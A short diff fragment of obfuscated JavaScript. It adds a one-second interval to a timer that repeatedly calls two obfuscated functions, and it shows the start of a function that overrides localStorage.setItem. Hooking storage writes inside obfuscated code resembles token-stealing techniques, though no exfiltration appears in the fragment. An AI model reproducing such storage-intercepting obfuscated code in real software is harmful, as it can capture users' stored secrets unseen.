@@ -14,7 +14,7 @@
 setInterval(async function () {
   _0x458d8b();
   _0x3cdb96();
-}
+}, 1000);
   function _0x286fa6() {
     var _0x41f1a1 = localStorage.setItem;
     localStorage.setItem = function (_0x3ac1d2, _0xe48682) {
